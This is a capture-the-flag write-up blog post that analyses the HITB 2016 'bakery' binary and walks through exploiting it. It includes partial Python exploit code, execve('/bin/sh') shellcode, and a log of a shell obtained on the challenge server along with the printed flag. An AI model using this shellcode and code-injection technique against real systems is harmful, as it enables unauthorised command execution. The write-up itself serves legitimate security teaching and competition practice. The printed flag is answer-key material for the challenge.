<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="HITB 2016 - Bakery write-up" prefix="og: http://ogp.me/ns#" property=og:title><meta content="HITB 2016 - Bakery write-up - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-04-01-hitb-teaser-2016-bakery property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="HITB 2016 - Bakery write-up - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-04-01-hitb-teaser-2016-bakery name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-04-01-hitb-teaser-2016-bakery",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": HITB 2016 - Bakery write-up - by hugsy",
      
    }
    </script><title>
  HITB 2016 - Bakery write-up
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>HITB 2016 - Bakery write-up</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 1 April 2016 <br> <br> <i>Reading time: 5 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><p>I participated to <a rel="noopener nofollow noreferrer" href=https://ctftime.org/event/325/ target=_blank>HITB Teaser CTF</a> only to have a bit of fun with there pwnable challenge(s) which I find usually fun and instructive. The teaser only offered one pwnable challenge, named <code>bakery</code>.<h3 id=info>Info</h3><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  !file ./bakery.910abf341053d25831ecb465b7ddf738
</span><span style=color:#bf616a>./bakery.910abf341053d25831ecb465b7ddf738:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=74fa32ca74594550d59ff5fb64b8dd523965cdfc, stripped
</span><span style=color:#bf616a>gef➤</span><span>  checksec ./bakery.910abf341053d25831ecb465b7ddf738
</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>./bakery.910abf341053d25831ecb465b7ddf738</span><span>'
</span><span style=color:#bf616a>Canary:</span><span>                                           Yes
</span><span style=color:#bf616a>NX</span><span> Support:                                       Yes
</span><span style=color:#bf616a>PIE</span><span> Support:                                      No
</span><span style=color:#bf616a>RPATH:</span><span>                                            No
</span><span style=color:#bf616a>RUNPATH:</span><span>                                          No
</span><span style=color:#bf616a>Partial</span><span> RelRO:                                    Yes
</span><span style=color:#bf616a>Full</span><span> RelRO:                                       No
</span></code></pre><p>It is a baking program, that allows to build your own recipe.<h3 id=vulnerability>Vulnerability</h3><p>After printing the available ingredients, the <code>main</code> function does this (at 0x0400CBC) <a href=https://i.imgur.com/yrFucNx.png target=_blank> <img alt=image_alt src=https://i.imgur.com/yrFucNx.png title=image_alt width=100%> </a><p>Which translates to the pseudo-code:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span>buf = </span><span style=color:#bf616a>mmap</span><span>(</span><span style=color:#d08770>NULL</span><span>, </span><span style=color:#d08770>0x1000</span><span>, RWX, flags, ...);
</span><span style=color:#bf616a>memset</span><span>(buf, '</span><span style=color:#96b5b4>\xc3</span><span>', </span><span style=color:#d08770>0x1000</span><span>);
</span><span style=color:#bf616a>srand</span><span>( </span><span style=color:#96b5b4>time</span><span>(</span><span style=color:#d08770>NULL</span><span>) );
</span><span>randint = </span><span style=color:#96b5b4>rand</span><span>() * </span><span style=color:#d08770>0x1337</span><span>;
</span><span style=color:#bf616a>printf</span><span>("</span><span style=color:#a3be8c>0v3n w4rm3d up to </span><span style=color:#d08770>%d</span><span style=color:#a3be8c> d3greez! (d4mn h0t!)</span><span style=color:#96b5b4>\n</span><span>", randint);
</span></code></pre><p>Then it enters a loop to add the ingredients:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#bf616a>printf</span><span>("</span><span style=color:#a3be8c>Add ingredient</span><span>");
</span><span style=color:#bf616a>fgets</span><span>(ingredient, </span><span style=color:#d08770>127</span><span>, stdin);
</span><span>ingredient[ </span><span style=color:#96b5b4>strlen</span><span>(ingredient)-</span><span style=color:#d08770>1 </span><span>] = '</span><span style=color:#96b5b4>\x00</span><span>';
</span><span style=color:#bf616a>strncmp</span><span>(ingredient, "</span><span style=color:#a3be8c>BAKE</span><span>", </span><span style=color:#d08770>4</span><span>);
</span></code></pre><p>If we enter <code>BAKE</code>, it will simply jump to the buffer allocated by <code>mmap</code> from above:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.text:0000000000400EB8                 </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>rax</span><span>, [</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>mmap_buf</span><span>]
</span><span style=color:#8fa1b3>.text:0000000000400EBF                 </span><span style=color:#b48ead>mov     </span><span>[</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>var_108</span><span>], </span><span style=color:#bf616a>rax
</span><span style=color:#8fa1b3>.text:0000000000400EC6                 </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>rdx</span><span>, [</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>mmap_buf</span><span>]
</span><span style=color:#8fa1b3>.text:0000000000400ECD                 </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>rax</span><span>, [</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>var_108</span><span>]
</span><span style=color:#8fa1b3>.text:0000000000400ED4                 </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>rdi</span><span>, </span><span style=color:#bf616a>rdx
</span><span style=color:#8fa1b3>.text:0000000000400ED7                 </span><span style=color:#b48ead>call    </span><span style=color:#bf616a>rax
</span></code></pre><p>Otherwise, it will check using <code>strstr()</code> if our ingredient we entered is in the list of valid ingredients. If the sub-string was found, it calls a function at 0x400B15 with 2 arguments, the string we provided as input for ingredient, and the random integer generated initially.<p>The function at 0x400B15 is fairly simply and could be translate to pseudo-code like this:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>int </span><span style=color:#8fa1b3>func_400B15</span><span>(</span><span style=color:#b48ead>char</span><span>* </span><span style=color:#bf616a>input</span><span>, </span><span style=color:#b48ead>int </span><span style=color:#bf616a>init</span><span>)
</span><span>{
</span><span>  </span><span style=color:#b48ead>int</span><span> accu;
</span><span>  </span><span style=color:#b48ead>int</span><span> i;
</span><span>  accu = init;
</span><span>  </span><span style=color:#b48ead>for</span><span>( i=</span><span style=color:#d08770>0</span><span>; i<</span><span style=color:#96b5b4>strlen</span><span>(input); i++ ) accu += input[i];
</span><span>  </span><span style=color:#b48ead>return</span><span> accu;
</span><span>}
</span></code></pre><p>The result is then <code>and</code>-ed to 0xff and written at current location in the mmap allocated buffer<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>.text:0000000000400E77                 </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>rax</span><span>, [</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>p_mmap_buf</span><span>]
</span><span style=color:#8fa1b3>.text:0000000000400E7E                 </span><span style=color:#b48ead>movzx   </span><span style=color:#bf616a>edx</span><span>, [</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>result</span><span>]
</span><span style=color:#8fa1b3>.text:0000000000400E85                 </span><span style=color:#b48ead>mov     </span><span>[</span><span style=color:#bf616a>rax</span><span>], </span><span style=color:#bf616a>dl
</span><span style=color:#8fa1b3>.text:0000000000400E87                 </span><span style=color:#b48ead>add     </span><span>[</span><span style=color:#bf616a>rbp</span><span>+</span><span style=color:#8fa1b3>p_mmap_buf</span><span>], </span><span style=color:#d08770>1
</span></code></pre><p>The pointer to the <code>mmap</code> buffer is incremented.<p>So what this program is doing, is using the “accumulator” function to write inside the <code>mmap</code> buffer, which will then be jumped into and executed.<h3 id=exploitation>Exploitation</h3><p>Getting the initial random integer can be done by reading from the socket until receiving the string <code>0v3n w4rm3d up to</code> and divide this value by 0x1337.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#65737e># get the init rand()
</span><span>    parts = s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#96b5b4>\n</span><span>").</span><span style=color:#bf616a>split</span><span>()
</span><span>    temp = </span><span style=color:#bf616a>int</span><span>(parts[</span><span style=color:#d08770>5</span><span>])
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got temp=</span><span style=color:#d08770>%d</span><span>" % temp)
</span><span>    rand = temp / </span><span style=color:#d08770>0x1337
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got rand=</span><span style=color:#d08770>%d</span><span>" % rand)
</span></code></pre><p>To reliably control the content of the <code>mmap</code>-ed buffer, we need to “compensate” the accumulation that the function is doing. Since we know the initial random integer, my approach was to use one of the valid ingredients (in this case <code>FLOUR</code>) which is required to pass the <code>strstr()</code> check, sum up the ascii values of the letters of the word, and add the random init.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>write_char_in_memory</span><span>(</span><span style=color:#bf616a>sock</span><span>, </span><span style=color:#bf616a>char</span><span>, </span><span style=color:#bf616a>init</span><span>):
</span><span>    sock.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>add ingredient> </span><span>")
</span><span>    [</span><span style=color:#d08770>...</span><span>]
</span><span>    base = init + </span><span style=color:#96b5b4>sum</span><span>( [</span><span style=color:#96b5b4>ord</span><span>(x) </span><span style=color:#b48ead>for </span><span>x </span><span style=color:#b48ead>in </span><span>'</span><span style=color:#a3be8c>FLOUR</span><span>'] )
</span></code></pre><p>If the value does not finish by a NULL, I calculate what is the closest upper bound to be aligned with 0, and substract the result with my value:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>find_closest_upper_bound</span><span>(</span><span style=color:#bf616a>x</span><span>):
</span><span>    a = x >> </span><span style=color:#d08770>8
</span><span>    a+= </span><span style=color:#d08770>1
</span><span>    </span><span style=color:#b48ead>return </span><span>a << </span><span style=color:#d08770>8
</span><span>
</span><span>[</span><span style=color:#d08770>...</span><span>]
</span><span>    top = base
</span><span>    </span><span style=color:#b48ead>if </span><span>base & </span><span style=color:#d08770>0xff </span><span>!= </span><span style=color:#d08770>0x00</span><span>:
</span><span>        top = </span><span style=color:#bf616a>find_closest_upper_bound</span><span>(base)
</span><span>    diff = top-base
</span></code></pre><p>This gives me in the <code>diff</code> variable what needs to be added to the stub `randint<ul><li>‘F’ + ‘L’ + ‘O’ + ‘U’ + ‘R’<code>. We can then padding this stub by appending to this stuff </code>diff<code>times</code>\x01`. This way we fully control the last byte, so we can append the character we actually want written in memory.</ul><p>Now that we can write reliably one character at a time, we can copy our shellcode:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>        sc = "</span><span style=color:#96b5b4>\x48\x31\xd2</span><span>"                                  </span><span style=color:#65737e># xor rdx, rdx
</span><span>        sc+= "</span><span style=color:#96b5b4>\x48\x31\xc0</span><span>"                                  </span><span style=color:#65737e># xor rax, rax
</span><span>        sc+= "</span><span style=color:#96b5b4>\x48\x31\xf6</span><span>"                                  </span><span style=color:#65737e># xor rsi, rsi
</span><span>        sc+= "</span><span style=color:#96b5b4>\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68</span><span>"      </span><span style=color:#65737e># mov rbx, 0x68732f6e69622f2f
</span><span>        sc+= "</span><span style=color:#96b5b4>\x48\xc1\xeb\x08</span><span>"                              </span><span style=color:#65737e># shr rbx, 0x8
</span><span>        sc+= "</span><span style=color:#96b5b4>\x53</span><span>"                                          </span><span style=color:#65737e># push rbx
</span><span>        sc+= "</span><span style=color:#96b5b4>\x48\x89\xe7</span><span>"                                  </span><span style=color:#65737e># mov rdi, rsp
</span><span>        sc+= "</span><span style=color:#96b5b4>\xc6\xc0\x3b</span><span>"                                  </span><span style=color:#65737e># mov al, 59
</span><span>        sc+= "</span><span style=color:#96b5b4>\x0f\x05</span><span>"                                      </span><span style=color:#65737e># syscall
</span><span>
</span><span>        </span><span style=color:#b48ead>for </span><span>c </span><span style=color:#b48ead>in </span><span>sc:
</span><span>            </span><span style=color:#bf616a>write_char_in_memory</span><span>(s, c, rand & </span><span style=color:#d08770>0xff</span><span>)
</span></code></pre><p>And to execute it, the only thing left is to start baking!<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>        s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>add ingredient> </span><span>")
</span><span>        s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>BAKE</span><span>" + '</span><span style=color:#96b5b4>\n</span><span>' )
</span></code></pre><p>Let’s go:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>$</span><span>  py gef-exploit.py
</span><span style=color:#bf616a>[+]</span><span> Connected to 52.17.31.229:31337
</span><span style=color:#bf616a>Attach</span><span> with GDB and hit Enter
</span><span style=color:#bf616a>[+]</span><span> Got banner
</span><span style=color:#bf616a>[+]</span><span> Got temp=654227
</span><span style=color:#bf616a>[+]</span><span> Got rand=133
</span><span style=color:#bf616a>[*]</span><span> Writing char=H rand=133
</span><span style=color:#bf616a>[*]</span><span> Using top=768, base=525
</span><span style=color:#bf616a>[*]</span><span> Sending ''FLOURAAA</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01</span><span style=color:#96b5b4>\x</span><span>01H''
</span><span style=color:#bf616a>[*]</span><span> Writing char=1 rand=133
</span><span style=color:#bf616a>[*]</span><span> Using top=768, base=525
</span><span style=color:#bf616a>[...]
</span><span style=color:#bf616a>[+]</span><span> Got it, interacting (Ctrl-C to break)
</span><span style=color:#bf616a>[+]</span><span> Get a PTY with '</span><span style=color:#a3be8c> python -c "import pty;pty.spawn(</span><span>'/bin/bash'</span><span style=color:#a3be8c>)"  </span><span>'
</span><span style=color:#bf616a>python -c </span><span>"</span><span style=color:#a3be8c>import pty;pty.spawn('/bin/bash')</span><span>"
</span><span style=color:#bf616a>bakery@ip-172-31-31-97:/$</span><span> cd home/bakery
</span><span style=color:#96b5b4>cd</span><span> home/bakery
</span><span style=color:#bf616a>bakery@ip-172-31-31-97:/home/bakery$</span><span> ls
</span><span style=color:#bf616a>ls
</span><span style=color:#bf616a>YOU_WANT_THIS_ONE</span><span>  bakery
</span><span style=color:#bf616a>bakery@ip-172-31-31-97:/home/bakery$</span><span> cat YOU_WANT_THIS_ONE
</span><span style=color:#bf616a>cat</span><span> YOU_WANT_THIS_ONE
</span><span style=color:#bf616a>You</span><span> win! The flag is HITB{24d467d954cc08efbfa6acd8341e55d7}
</span><span style=color:#bf616a>bakery@ip-172-31-31-97:/home/bakery$
</span></code></pre><p>Fun challenge, thanks to the whole HITB crew for their continuous creativity. And as usual, the full exploit can be found <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/06ff00997c9d07099f27 target=_blank>here</a>.<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/hitb/>#hitb</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=HITB 2016 - Bakery write-up" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-05-09-asis-ctf-2016-feap/> <section class=post-nav-teaser><b class=post-nav-title>ASIS CTF 2016 - feap write-up</b><p class=post-nav-excerpt>Info As usual, the vulnerable file is here gef➤ !file ./feap ./feap: ELF 6…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-03-28-volgactf-2016-web-of-science/> <section class=post-nav-teaser><b class=post-nav-title>VolgaCTF 2016 - Web of Science</b><p class=post-nav-excerpt>Info gef➤ !file ./web_of_science ./web_of_science: ELF 64-bit LSB executab…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>